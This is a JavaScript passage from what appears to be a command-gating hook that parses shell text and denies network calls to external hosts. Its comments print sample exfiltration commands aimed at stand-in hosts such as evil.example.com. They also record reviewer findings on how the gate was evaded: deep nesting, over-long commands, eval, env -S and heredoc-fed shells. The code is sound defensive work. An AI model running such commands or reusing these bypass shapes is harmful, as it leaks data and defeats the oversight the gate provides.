// $( ... ), backtick, ( ... ), <( ... ) and >( ... ) bodies are commands of their own: each is classified
// separately (with this command's assignments and loop values), and the rest of the command is read with
// the frame blanked out (length-preserving per code point, so the lexer's indices still align). The frames
// come from the shared lexer (card fae0712e), so a substitution counts only where the shell runs it: at top
// level, inside "...", inside an unquoted-tag heredoc body. Inside '...', $'...', a comment and a
// quoted-tag heredoc body it is inert text (a HANDOFF.md written with `cat > f <<'EOF'` that mentions a curl
// in backticks is no command). A plain ${ } and an arithmetic $(( )) / (( )) run no command of their own:
// a command frame inside one is still found; an arithmetic frame is blanked like the earlier lifter did,
// a ${ } stays in the text (expand() reads `${U}`). bash 5.3's `${ cmd; }` / `${| cmd; }` runs a command
// and is a command frame (over-reading is the safe side).
const CMD_FRAMES = new Set(['$(', '`', '(', '<(', '>('])
function substParents(substs) { // the innermost enclosing subst of each (-1 = top); substs come in opening order
  const par = new Array(substs.length).fill(-1); const open = []
  substs.forEach((x, k) => {
    while (open.length && substs[open[open.length - 1]].end <= x.start) open.pop()
    par[k] = open.length ? open[open.length - 1] : -1
    open.push(k)
  })
  return par
}
// The children of each subst under substParents() `par`, computed once per par array.
const KIDS = new WeakMap()
function childrenOf(par) {
  let kids = KIDS.get(par)
  if (!kids) {
    kids = par.map(() => [])
    par.forEach((p, j) => { if (p >= 0) kids[p].push(j) })
    KIDS.set(par, kids)
  }
  return kids
}
// Adds the frames of subst k of lexer result t (over code points cp) to out, shifted by `shift`. A walk with its own
// stack, in the same pre-order as a recursion: Viktor 42933 HIGH 5, `$(( ` nested 2000 deep (and ${x:- 6000 deep)
// overflowed the call stack in the recursive walk, the hook's catch allowed, and bash ran the curl after it. The
// children come from an index, not a scan of every subst per frame (that was quadratic in the nesting).
function visitFrame(t, cp, par, k0, out, shift) {
  const kids = childrenOf(par)
  const todo = [k0]
  while (todo.length) {
    const k = todo.pop()
    const x = t.substs[k]
    const runs = CMD_FRAMES.has(x.kind) || (x.kind === '${' && /^[\s|]$/.test(cp[x.inner[0]] ?? ''))
    if (runs) {
      out.push({ start: shift + x.start, end: shift + x.end, inner: cp.slice(x.inner[0], x.inner[1]).join('') })
      continue
    }
    if (x.kind !== '${') out.push({ start: shift + x.start, end: shift + x.end, inner: null }) // arithmetic: blanked
    for (let m = kids[k].length - 1; m >= 0; m--) todo.push(kids[k][m])
  }
}
// The live substitutions of an unquoted-tag heredoc body (the lexer gives the body as one class 'u' run):
// a backslash escapes, and each $( ${ $(( or backtick opener is measured by lexing the text from there.
function bodyFrames(cp, h, out) {
  let k = h.bodyStart
  while (k < h.bodyEnd) {
    const ch = cp[k]
    if (ch === '\\') { k += 2; continue }
    if (ch === '`' || (ch === '$' && (cp[k + 1] === '(' || cp[k + 1] === '{'))) {
      // Lexed from the opener over a growing window (to the end of its line, then doubled): where a
      // substitution closes depends only on the text before the closer, so the first window it closes in
      // gives the same answer as the whole body, without lexing the rest of the body once per opener.
      let len = 0
      while (k + len < h.bodyEnd && cp[k + len] !== '\n') len++
      let tail; let t
      for (len = Math.max(len + 1, 64); ; len *= 2) {
        tail = cp.slice(k, Math.min(k + len, h.bodyEnd))
        t = lex(tail.join(''))
        if (t.substs[0].inner[1] < t.substs[0].end || k + len >= h.bodyEnd) break
      }
      const from = out.length
      visitFrame(t, tail, substParents(t.substs), 0, out, k)
      // blanked without its newlines: an unterminated opener runs to the body's end, and the terminator
      // line must stay a line of its own
      for (const f of out.slice(from)) f.body = true
      k += Math.max(1, t.substs[0].end)
      continue
    }
    k++
  }
}
// Everything classify() reads about one command text. Code-point arrays throughout, as the lexer counts.
//   norm:  the text with every backslash-newline the shell removes taken out (not one inside '...' or a
//          comment, unlike the earlier regex), so `cu\<nl>rl` is `curl`;
//   frames: the command frames to classify on their own ({start, end, inner}; inner null = arithmetic);
//   blank / blankCp / lxB: the text with the frames blanked, and its lexer result;
//   segs, segWords: the top-level simple commands of `blank` and their words;
//   codeText: norm without comments (for the "external URL literal anywhere" reserves).
function readCommand(command) {
  let lx = lex(command)
  let norm = command
  if (lx.cls.includes('l')) {
    const raw = Array.from(command)
    norm = raw.filter((_, k) => lx.cls[k] !== 'l').join('')
    lx = lex(norm)
  }
  const cp = Array.from(norm)
  const par = substParents(lx.substs)
  const frames = []
  lx.substs.forEach((_, k) => { if (par[k] === -1) visitFrame(lx, cp, par, k, frames, 0) })
  for (const h of lx.heredocs) if (!h.quoted) bodyFrames(cp, h, frames)
  frames.sort((a, b) => a.start - b.start)
  // A position is blanked when a frame covers it, except a newline that only heredoc-body frames cover. Counted with
  // difference arrays: blanking each frame's span in turn was quadratic in the nesting (Viktor 42933 HIGH 5 shapes:
  // 40 000 nested frames took 4-6 s, towards the hook's timeout, which allows).
  const blankCp = cp.slice()
  const anyD = new Int32Array(cp.length + 1), codeD = new Int32Array(cp.length + 1)
  for (const f of frames) {
    const a = Math.max(0, f.start), b = Math.min(f.end, cp.length)
    if (a >= b) continue
    anyD[a]++; anyD[b]--
    if (!f.body) { codeD[a]++; codeD[b]-- }
  }
  for (let k = 0, any = 0, code = 0; k < cp.length; k++) {
    any += anyD[k]; code += codeD[k]
    if (code > 0 || (any > 0 && cp[k] !== '\n')) blankCp[k] = ' '
  }
  // Viktor 42852 HIGH 3: a '#' right after a closed frame is word text in bash (echo $(true)#; b runs b). The blanked
  // frame leaves a space before it, and the second lex would read a comment there; the original lex decides.
  for (const f of frames) if (f.end < cp.length && cp[f.end] === '#' && lx.cls[f.end] === 'c') blankCp[f.end] = '_'
  const blank = blankCp.join('')
  const lxB = lex(blank)
  const segs = lxB.segments.filter((s) => s.frame === 'top')
  return {
    norm, cp, lx, frames, blank, blankCp, lxB, segs,
    segWords: segs.map((s) => lexWords(blank, lxB, s)),
    problems: [...new Set([...lx.problems, ...lxB.problems])],
    codeText: cp.filter((_, k) => lx.cls[k] !== 'm').join(''),
  }
}
// Kept for its tests: the command with its command frames blanked (UTF-16 length-preserving) and the frame
// bodies, in order. classify() uses readCommand() directly.
export function liftSubstitutions(text) {
  const r = readCommand(String(text ?? ''))
  const stripped = r.cp.map((ch, k) => (r.blankCp[k] === ch ? ch : ' '.repeat(ch.length))).join('')
  return { stripped, inners: r.frames.filter((f) => f.inner !== null).map((f) => f.inner) }
}
// curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
// curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
// the host while URL_RE (which needs a scheme) and the name list (`curl *https://*`) both miss it.
// So for curl the argv is read: every positional argument, the --url value, and the proxy / DoH /
// connect-to / resolve values are destinations, and a non-loopback host in any of them denies.
// Flags that take a value are skipped with their value, so `-H "Host: x.y"` or `-o out.html` is
// never read as a destination. An unknown long option is assumed to take no value: if that is
// wrong, its value is read as a destination, which errs toward a deny, never toward a pass.
const CURL_SHORT_WITH_VALUE = new Set('AbcCdDeEFHKmoPQrtTuUwxXyYz'.split(''))
const CURL_LONG_WITH_VALUE = new Set([
  'data', 'data-ascii', 'data-binary', 'data-raw', 'data-urlencode', 'json', 'form', 'form-string',
  'header', 'proxy-header', 'output', 'output-dir', 'request', 'config', 'user', 'proxy-user',
  'user-agent', 'referer', 'cookie', 'cookie-jar', 'dump-header', 'write-out', 'max-time',
  'connect-timeout', 'retry', 'retry-delay', 'retry-max-time', 'range', 'continue-at', 'cert',
  'cert-type', 'key', 'key-type', 'pass', 'cacert', 'capath', 'ciphers', 'interface', 'local-port',
  'limit-rate', 'max-filesize', 'max-redirs', 'noproxy', 'upload-file', 'time-cond', 'trace',
  'trace-ascii', 'stderr', 'unix-socket', 'abstract-unix-socket', 'oauth2-bearer', 'aws-sigv4',
  'expect100-timeout', 'keepalive-time', 'happy-eyeballs-timeout-ms', 'variable', 'url-query',
  'mail-from', 'mail-rcpt', 'mail-auth', 'hostpubmd5', 'hostpubsha256', 'pubkey', 'krb',
  'delegation', 'dns-servers', 'dns-interface', 'dns-ipv4-addr', 'dns-ipv6-addr', 'speed-limit',
  'speed-time', 'tls-max', 'proto', 'proto-redir', 'proto-default', 'etag-save', 'etag-compare',
  'parallel-max', 'create-file-mode', 'ftp-port', 'quote', 'service-name', 'sasl-authzid',
  'login-options', 'netrc-file', 'crlfile', 'engine', 'random-file', 'egd-file', 'socks5-gssapi-service',
  // destination-bearing: read below, still consumed as values
  'url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0',
  'doh-url', 'connect-to', 'resolve',
])
const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'x'])
const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i

// The words of a shell text (one simple command, or an expanded copy of one), quotes removed, from the
// shared lexer (card fae0712e): backslash pairs reduced the shell's way, $'...' decoded, a substitution
// verbatim inside its word. A newline or separator in the text only ends a word.
export function shellWords(text) {
  const t = String(text ?? '')
  const lx = lex(t)
  return lx.segments.filter((s) => s.frame === 'top').flatMap((s) => lexWords(t, lx, s).map((w) => w.text))
}
// The host of a curl destination, scheme optional; null when the HOST is not a literal hostname
// (an unexpanded $VAR in the host, a glob, a relative path). A variable in the PATH does not hide
// the host: `curl "https://raw.githubusercontent.com/o/r/$p"` in a loop is still a known destination
// (an earlier `value.includes('$')` check let exactly that through). The scheme may be a variable
// too (`$PROTO://host`), so everything up to `://` is dropped.
export function destHost(value) {
  if (!value) return null
  const noScheme = value.replace(/^[^/?#\s]*:\/\//, '')
  const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
  const h = m ? m[1].toLowerCase() : ''
  if (HOSTNAME.test(h)) return h
  // A literal host that is not a regular hostname (single label, 0x0a.0.0.1, 167772161, 10.1) is
  // still a destination curl will resolve; returning null here let it pass unchecked. Fail closed.
  // Only plain literal tokens qualify, so a $VAR, a glob or a relative path still yields null.
  return /^(?=[^.]*[a-z0-9])[a-z0-9][a-z0-9._-]*$/.test(h) ? h : null
}
// Every external destination host in a curl argv (the words AFTER `curl`).
export function curlDestinations(args) {
  const dests = []
  const addUrl = (v) => { const h = destHost(v); if (h) dests.push(h) }
  const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()) }
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
    if (w === '--' ) continue
    if (w.startsWith('--')) {
      const [name, inline] = w.slice(2).split(/=(.*)/s)
      if (!CURL_LONG_WITH_VALUE.has(name)) continue
      const v = inline !== undefined ? inline : args[++k]
      if (CURL_DEST_URL.has(name)) addUrl(v)
      else if (CURL_DEST_PARTS.has(name)) addParts(v)
      continue
    }
    if (w.startsWith('-') && w.length > 1) {
      for (let q = 1; q < w.length; q++) {
        if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
        const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
        if (CURL_DEST_URL.has(w[q])) addUrl(v)
        break
      }
      continue
    }
    addUrl(w) // positional: always a URL to curl
  }
  return dests.filter((h) => !isLocalHost(h))
}
// True when a curl destination (positional or --url / -x value) still holds a shell variable after
// this command's assignments and loop values were expanded: curl will reach a host the text does
// not name. unresolvedHost decides what "still holds" means: unresolvedHostVar (any $NAME in the host; only used
// together with an external URL literal elsewhere in the command, see classify) or curlOperatorHost (card f2a0f976).
export function curlHasUnresolvedDestination(args, unresolvedHost) {
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue }
    if (w === '--') continue
    if (w.startsWith('--')) {
      const [name, inline] = w.slice(2).split(/=(.*)/s)
      if (!CURL_LONG_WITH_VALUE.has(name)) continue
      const v = inline !== undefined ? inline : args[++k]
      if (CURL_DEST_URL.has(name) && unresolvedHost(v)) return true
      continue
    }
    if (w.startsWith('-') && w.length > 1) {
      for (let q = 1; q < w.length; q++) {
        if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
        const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
        if (CURL_DEST_URL.has(w[q]) && unresolvedHost(v)) return true
        break
      }
      continue
    }
    if (unresolvedHost(w)) return true
  }
  return false
}
// The HOST part (scheme and userinfo dropped, up to the first / ? #) holds a $VAR or ${VAR}.
// A variable only in the path (`http://localhost:3420/api/$id`) names its host and is not this.
function unresolvedHostVar(value) {
  if (!value) return false
  const noScheme = String(value).replace(/^[^/?#\s]*:\/\//, '')
  const host = /^(?:[^@/?#]*@)?([^/?#]*)/.exec(noScheme)?.[1] ?? ''
  return /\$\{?[A-Za-z_]/.test(host)
}
// The host part of a destination, read with ${ } nesting: a `/`, `:` or `@` inside ${u/a/b} or ${u:-https://x} is
// part of the expansion, not of the URL. Scheme (anything up to a depth-0 `://` before the first depth-0 / ? #) and
// userinfo (up to the last depth-0 @) dropped; the host ends at the next depth-0 / ? # (a later `://` starts with a
// `/`, so it ends the authority too, as curl reads `http://localhost://x`). An unclosed ${ runs to the end: the whole
// rest is the host.
function destHostRegion(value) {
  const s = String(value ?? '')
  const cuts = [] // [index, char] of the depth-0 / ? # @ and `://`
  let depth = 0
  for (let k = 0; k < s.length; k++) {
    if (s[k] === '$' && s[k + 1] === '{') { depth++; k++; continue }
    if (depth) { if (s[k] === '}') depth--; continue }
    if (s.startsWith('://', k)) { cuts.push([k, '://']); k += 2; continue }
    if ('/?#@'.includes(s[k])) cuts.push([k, s[k]])
  }
  let start = 0
  const scheme = cuts.find(([, c]) => c !== '@')
  if (scheme?.[1] === '://') start = scheme[0] + 3
  const end = cuts.find(([k, c]) => k >= start && c !== '@')?.[0] ?? s.length
  const at = cuts.filter(([k, c]) => c === '@' && k >= start && k < end).pop()
  return s.slice(at ? at[0] + 1 : start, end)
}
// Card f2a0f976 (Viktor 43009 LOW 2): a ${ } in a curl destination HOST that is not a plain ${NAME} -- an operator
// the gate does not compute (${u%/}, ${u/a/b}, ${u:0:30}, ${u:+x}), an indirection ${!u}, a length ${#u}, a
// positional ${1} -- is an unresolved destination WITH or WITHOUT an external URL literal elsewhere: a host given
// without a scheme is no literal (`U=evil.example.com; curl ${U%/}/p` passed). After expand the simple defaults are
// gone (computed), so what is left here was not read.
const OPERATOR_EXPANSION = /\$\{(?![A-Za-z_][A-Za-z0-9_]*\})/
function curlOperatorHost(value) {
  return OPERATOR_EXPANSION.test(destHostRegion(value))
}
// A default form in a destination HOST over a name this command neither assigns nor loops over: expand reads it as the
// word, but bash takes the ENVIRONMENT's value when there is one, which is as unread as a bare $NAME from the environment.
// The fail-closed reserve (an external URL literal in the command) therefore still counts it as unresolved, as it did
// before the defaults were computed (card f2a0f976: `curl ${DASH:-http://localhost:3420}/x; ... https://<ext>` denied).
function unsetDefaultHost(value, env, loops) {
  for (const m of destHostRegion(value).matchAll(/\$\{([A-Za-z_][A-Za-z0-9_]*):?[-=]/g)) {
    if (env[m[1]] === undefined && !(m[1] in loops)) return true
  }
  return false
}
// An external URL literal anywhere in the command text (vendor-listed hosts do not count).
function hasExternalLiteral(text, vendorHosts, vendorDomains) {
  for (const m of String(text).matchAll(URL_RE)) {
    const h = hostOf(m[0])
    if (h && !isLocalHost(h) && !vendorHosts.has(h) && !hostInDomains(h, vendorDomains)) return true
  }
  return false
}
// `scope` carries the enclosing command's assignments and loop values into a substitution, and
// whether the WHOLE command (outermost text) carries an external URL literal.
// Index of the real command word of a span's words (the lexer's, quotes removed, command frames blanked).
// Besides assignments and PREFIX_WORDS it
// steps over the words that open a body without being a command (decfb196, Viktor 2597/2634):
//   - a case header up to its `in` (`case $x in a) curl ...`), and a case pattern: a leading word
//     ending in `)` (`a)`, `a|b)`, `*)`; `(a)` is a subshell frame, blanked before this);
//   - a function head: `function NAME [{]`, or `NAME {` (`NAME()` leaves `NAME {` after blanking);
//   - a leading `in`: a case header broken before it (`case $x` NEWLINE `in a) curl ...`) leaves a
//     span that starts with `in` (Viktor L1, decfb196).
// Fail-closed direction: a word wrongly stepped over only lets a LATER word be judged as curl.
// subscriptEnd: the index of the word that closes an array subscript the lexer split at a blank (`V[0 ]=x`), when
// it ends in `]=` / `]+=` within 8 words; -1 otherwise (Viktor 43724 LELET 1).
function subscriptEnd(mw, i) {
  for (let k = i + 1; k < mw.length && k < i + 8; k++) {
    if (mw[k].includes(']')) return /^[^\]]*\]\+?=/.test(mw[k]) ? k : -1
  }
  return -1
}
function commandWordAt(mw) {
  let i = 0
  while (i < mw.length) {
    const w = mw[i]
    const base = w.includes('/') ? w.split('/').pop() : w
    if (WRAPPERS.has(base)) i = skipWrapperOptions(mw, i + 1, base)
    // NAME+=value is an assignment prefix too (`V+=x curl <url>` runs curl; card 772cd001: read as the command word it
    // hid the curl, and with a variable command word every `A+=$B` span was expanded as a command). An array element
    // (`V[0]=x curl <url>`, Viktor 43715 LELET 1) is an assignment prefix in bash as well.
    else if (/^[A-Za-z_][A-Za-z0-9_]*(?:\[[\s\S]*\])?\+?=/.test(w) || PREFIX_WORDS.has(w)) i++
    // a subscript the lexer split at a blank (`V[0 ]=x curl`, `V[ 0]=x curl`): bash still reads one assignment
    else if (/^[A-Za-z_][A-Za-z0-9_]*\[[^\]]*$/.test(w) && subscriptEnd(mw, i) !== -1) i = subscriptEnd(mw, i) + 1
    else if (w === 'case') { const at = mw.indexOf('in', i + 1); i = at === -1 ? mw.length : at + 1 }
    else if (w === 'in' && i === 0) i++
    else if (w === 'function') i += mw[i + 2] === '{' ? 3 : 2
    else if (mw[i + 1] === '{' && /^[A-Za-z_][\w.:-]*$/.test(w)) i += 2
    else if (w.endsWith(')') && !w.startsWith('$')) i++
    else break
  }
  return i
}

// ---- stdin-fed interpreters and shells (Viktor 3d3307dd, reproduced 2026-11-05) ----------------
// `python3 - <<'PY'`, `node - <<'JS'`, `bash <<EOF`, `sh -s <<EOF`, a here-string (`python3 - <<< '...'`)
// and a pipe (`cat <<'EOF' | python3`) all hand the interpreter its PROGRAM on stdin. A heredoc body is
// no command (correctly: for every other command it is data), so before this the program
// was never read and these shapes passed (Kernel 27756, Szigma 28413).
const SHELLS = /^(?:bash|sh|zsh|dash|ksh)$/
// Options whose VALUE is the next word (python -W/-X, node -r/--require/--import/--loader, shell -o).
const VALUE_OPTS = new Set(['-W', '-X', '-r', '--require', '--import', '--loader', '--experimental-loader', '-o', '-O'])
// The interpreter reads its PROGRAM from stdin: no code flag and no script argument (or a lone `-`).
function stdinFed(mw, i) {
  const cmd = mw[i].split('/').pop()
  if (!(INTERPRETER.test(cmd) || SHELLS.test(cmd))) return false
  // Redirections are not program arguments. The words now include quoted ones (card fae0712e), so a bare
  // operator word takes its target with it: `python3 <<< "$code"` and `python3 << 'PY'` are stdin-fed.
  const args = []
  for (let j = i + 1; j < mw.length; j++) {
    if (/^\d*(?:<<<|<<-?|<>|>>?|<|>\||&>>?|[<>]&)$/.test(mw[j])) { j++; continue }
    if (!/^(?:\d*[<>]|&>)/.test(mw[j])) args.push(mw[j])
  }
  // A code flag means the program is in the argv, not on stdin. For a shell only `-c` is one: its `-e`,
  // `-E`, `-p` are errexit / errtrace / privileged (`bash -e <<EOF`, Viktor 28589). `-r` is code only
  // for php; for node, ruby, bun and deno it preloads a module (Viktor 28585 (2)).
  const codeFlag = (w) => w === '-c' || (CODE_FLAG.has(w) && !SHELLS.test(cmd) && (w !== '-r' || cmd === 'php'))
  if (args.some(codeFlag)) return false
  // `python3 -m mod`: the program is a module, not stdin.
  if (args.includes('-m')) return false
  // The FIRST positional argument decides: `-`, /dev/stdin or /dev/fd/0 is stdin, anything else is a
  // program file (`node script.js`, `bash x.sh`, and `bash agent-msg.sh a b - <<EOF`, where the `-` is
  // the SCRIPT's argument). The value of an option that takes one is skipped, so `python3 -W ignore -`
  // and `-X utf8 -` are stdin (Viktor 28582 X1, X3). A shell's `-s` before any positional reads the
  // program from stdin and turns what follows into the script's arguments (`bash -s -- arg`, X4).
  // `deno run -`: the subcommand is skipped (X5).
  let first = null
  for (let j = 0; j < args.length; j++) {
    const w = args[j]
    if (VALUE_OPTS.has(w)) { j++; continue }
    if (w === '--') { first = args[j + 1] ?? null; break }
    if (w !== '-' && w.startsWith('-')) {
      // A short-option cluster: a shell's `s` anywhere in it reads stdin (`-es`); a value-taking LAST
      // letter takes the next word as its value (`bash -euo pipefail <<EOF`, `python3 -bW ignore -`;
      // Viktor 28585 (1)).
      const cluster = /^-[A-Za-z]+$/.test(w) ? w.slice(1) : ''
      if (SHELLS.test(cmd) && cluster.includes('s')) return true
      if (cluster.length > 1 && (SHELLS.test(cmd) ? /[oO]$/ : /[WX]$/).test(cluster)) j++
      continue
    }
    if (cmd === 'deno' && w === 'run' && first === null) continue
    first = w; break
  }
  return first === null || first === '-' || first === '/dev/stdin' || first === '/dev/fd/0'
}
// ---- a shell's -c <string> (Viktor 28589, card 55b51e54) -----------------------------------------
// `bash -c 'curl https://x'` and `sh -c "curl ..."` passed: a shell is not an INTERPRETER, and the
// string after -c is one quoted word, so nothing read the command it runs. The string is a command line
// of its own: it is classified like a $( ... ) substitution, with
// the same rules (curl destination from the argv, a one-liner only with a network primitive), the
// enclosing assignments and loop values, and the same depth limit. Judging it by "any URL in the
// string" would have repeated the stdin-shell false denies (a localhost call whose JSON carries a
// link). The shell word is searched in the WHOLE span, not only at the command word, because the
// usual carriers put it later: `timeout 10 sh -c`, `xargs -I{} sh -c`, `find . -exec sh -c`.
// Options end at the first word that is not one: `bash x.sh -c y` runs x.sh, and its -c is the
// script's argument. A -c anywhere in a short-option cluster counts (`bash -lc`, `sh -ec`).
// It reads the lexer's words of the span (card fae0712e), quotes removed: a heredoc body or a comment
// that merely mentions `bash -c '...'` is no word of the span, a quoted text that does is ONE word (not a
// shell), and the string is the word after the last option ($'...' decoded).
const SHELL_LONG_WITH_VALUE = new Set(['--rcfile', '--init-file'])
export function shellCStrings(ws) {
  const out = []
  for (let k = 0; k < ws.length; k++) {
    // `env -S <line>` / `--split-string[=]<line>` runs <line> as a command line (card 74d46cd0).
    if (ws[k].split('/').pop() === 'env') {
      for (let j = k + 1; j < ws.length && ws[j].startsWith('-'); j++) {
        const w = ws[j]
        if (w === '-S' || w === '--split-string' || w === '--split-string=') {
          if (ws[j + 1]) out.push(ws[j + 1])
          j++
        } else if (w.startsWith('--split-string=')) out.push(w.slice('--split-string='.length))
        else if (/^-[A-Za-z]*S[A-Za-z]*$/.test(w)) {
          // A short cluster with S (`-iS '<line>'`, `-vScurl`, Viktor 30051): the line is the rest of the cluster after
          // the S, or the next word when the S is its last letter.
          const rest = w.slice(w.indexOf('S') + 1)
          if (rest) out.push(rest)
          else { if (ws[j + 1]) out.push(ws[j + 1]); j++ }
        } else if (w.startsWith('-S') && w.length > 2) out.push(w.slice(2))
        else if (WRAPPERS.get('env').has(w)) j++
      }
      continue
    }
    if (!SHELLS.test(ws[k].split('/').pop())) continue
    let hasC = false; let j = k + 1
    for (; j < ws.length; j++) {
      const w = ws[j]
      if (w === '--') { j++; break }
      if (SHELL_LONG_WITH_VALUE.has(w)) { j++; continue }
      if (w.startsWith('--')) continue
      if (!/^[-+][A-Za-z]+$/.test(w)) break
      if (w[0] === '-' && w.includes('c')) hasC = true
      if (/[oO]$/.test(w) && j + 1 < ws.length) j++ // -o pipefail, -euo pipefail, +O extglob
    }
    if (hasC && ws[j]) out.push(ws[j])
  }
  return out
}
// `eval` as the command word (card 40305fb7, Viktor 42794 INFO, measured by Dave on prod d85d82e3): `eval "curl <url>"`
// and `eval curl <url>` passed, because the command word was eval, not curl, and nothing read what eval runs. Bash
// joins eval's arguments (quotes already removed) with single spaces and runs the result as a command line, so the
// joined words are judged like a `bash -c` string. Only at the command word (after assignments and wrappers such as
// `command` / `builtin`): a word `eval` elsewhere (`echo eval curl <url>`, `git log --grep eval`) runs nothing. A
// leading `--` is eval's end of options and is dropped. A command word that is a variable (`f=eval; $f ...`) is not
// resolved here, as for every other command (`f=curl; $f <url>` passes too; a separate finding).
export function evalString(mw, i) {
  if (i >= mw.length || mw[i] !== 'eval') return null
  const args = mw.slice(i + 1)
  if (args[0] === '--') args.shift()
  return args.length ? args.join(' ') : null
}
// Text of the heredoc bodies announced in segment s (not a `<<<` here-string: its text is already in the
// span), from the lexer's heredocs; an unterminated body runs to the end, as the shell reads it.
function heredocBodies(r, s) {
  return r.lxB.heredocs.filter((h) => h.op >= s.start && h.op < s.end).map((h) => r.cp.slice(h.bodyStart, h.bodyEnd).join(''))
}
// The segment before segs[k] hands its output to segs[k] through a pipe (`|` or `|&`, not `||`).
function pipedFrom(r, k) {
  if (k === 0) return false
  let p = r.segs[k - 1].end
  while (p < r.segs[k].start && (r.blankCp[p] === ' ' || r.blankCp[p] === '\t')) p++
  return r.blankCp[p] === '|' && r.lxB.cls[p] === 'c' && r.blankCp[p + 1] !== '|'
}

// The unparseable-external reserve (Klodel 42889) on a text: quotes and backslashes off (so c""url counts), an
// external URL literal and a network tool, or an interpreter with a network primitive.
function reserveHit(text, vendorHosts, vendorDomains) {
  const raw = text.replace(/['"\\]/g, '')
  return hasExternalLiteral(raw, vendorHosts, vendorDomains)
    && (NET_TOOL_RAW.test(raw) || (INTERPRETER_RAW.test(raw) && NET_PRIMITIVE.test(raw)))
}
// The cheap reading, for a command the full reading cannot judge (too long, or an internal error), from the raw text
// (backslash-newlines, quotes and backslashes off). It denies wherever the full reading would deny for a network
// tool, an interpreter, a shell or the gh-pr pin; it does not repeat subst-too-deep / shell-c-too-deep (an external
// literal in a deep nesting with none of those named), nor, after an internal error, a curl that names a URL literal
// besides its unread destination:
//   'external': an external URL literal with a network tool, an interpreter with a network primitive (reserveHit),
//               or a shell (a stdin-fed shell denies on any external literal it is fed: stdin-shell-external);
//   'network':  a network tool, or gh-pr.mjs (its pin is fail-closed, GHPRPIN P2). In the `strict` reading (too long)
//               always; after an internal error only when the text holds no URL literal at all (Viktor 2026-11-15
//               LOW 1: `curl $U`, `curl evil.example.com/x`), so a dashboard call to its literal http://localhost
//               URL still passes a crashed gate, as the header promises.
const SHELL_RAW = /(?<![\w.-])(?:bash|sh|zsh|dash|ksh)(?![\w-])/
function cheapVerdict(command, vendorHosts, vendorDomains, strict) {
  const text = String(command ?? '').replace(/\\\n/g, '')
  const raw = text.replace(/['"\\]/g, '')
  if (reserveHit(text, vendorHosts, vendorDomains) || (SHELL_RAW.test(raw) && hasExternalLiteral(raw, vendorHosts, vendorDomains))) return 'external'
  if (raw.includes('gh-pr.mjs')) return 'network'
  if (NET_TOOL_RAW.test(raw) && (strict || !new RegExp(URL_RE.source, 'i').test(raw))) return 'network'
  return null
}
// Above this length the full reading is not tried: parts of it grow faster than the text (Viktor 2026-11-15 HIGH 6:
// three shapes of 100-324 KB took 10-47 s, past the hook's 10 s timeout, which allows, and bash ran the curl). The
// longest real command in the fleet's 141 979 was 26 180 characters. A long command is judged by the cheap, strict
// reading: an allow only without any network tool, gh-pr.mjs, or an external URL literal next to an interpreter or a
// shell. A literal-only rule would have let `curl evil.example.com/x` padded past the cap through.
export const MAX_COMMAND_CHARS = 65536
// An internal error while reading a command was an allow: the hook's catch lets the call through (Viktor 42933
// HIGH 5: a RangeError from a deep nesting, and bash ran the curl after it). Whatever throws now, the cheap reading
// decides; without a hit the error goes on to the caller as before.
export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), scope = null) {
  try {
    if (typeof command === 'string' && command.length > MAX_COMMAND_CHARS) {
      const why = cheapVerdict(command, vendorHosts, vendorDomains, true)
      return why ? { deny: true, reason: `command-too-long-${why}`, hosts: [] } : { deny: false, reason: 'command-too-long', hosts: [] }
    }
    return classifyRead(command, depth, vendorHosts, vendorDomains, scope)
  } catch (e) {
    const why = cheapVerdict(command, vendorHosts, vendorDomains, false)
    if (why) return { deny: true, reason: `internal-error-${why}`, hosts: [] }
    throw e
  }
}
function classifyRead(command, depth, vendorHosts, vendorDomains, scope) {
  const r = readCommand(String(command ?? ''))
  const outer = scope ?? { env: Object.create(null), loops: Object.create(null), externalLiteral: hasExternalLiteral(r.codeText, vendorHosts, vendorDomains) }
  const segText = (s) => r.blankCp.slice(s.start, s.end).join('')
  // This command's own assignments and loops override the enclosing ones (a substitution runs in a
  // subshell that inherits them). Collected before the inner commands are judged, so the curl in
  // `u=<url>; x=$(curl -s $u)` reads u.
  // Viktor 2026-11-15 (b58374d7, HIGH 6): copying both into every frame was O(variables) per frame, quadratic in the
  // command (12 000 `vN=$(echo a); ` took 14-17 s, past the hook's timeout, which allows). env is only ever looked up by
  // name (expand), so a frame's own assignments go on a layer over the enclosing env; loops is read by key order
  // (loopVariants), so it is copied only when the frame has loops of its own.
  const records = []
  const own = collectAssignments(r, outer.env, outer.loops, records)
  const env = Object.keys(own).length ? Object.assign(Object.create(outer.env), own) : outer.env
  const ownLoops = Object.entries(collectLoops(r, env))
  const fnValues = functionValues(r, records, env)
  const loops = ownLoops.length || fnValues.length ? Object.assign(Object.create(null), outer.loops) : outer.loops
  for (const [v, vals] of ownLoops) loops[v] = [...(loops[v] ?? []), ...vals]
  for (const [v, vals] of fnValues) if (!(v in loops)) loops[v] = vals
  const inners = r.frames.filter((f) => f.inner !== null).map((f) => f.inner)
  if (depth < 4) {
    const inner = { env, loops, externalLiteral: outer.externalLiteral }
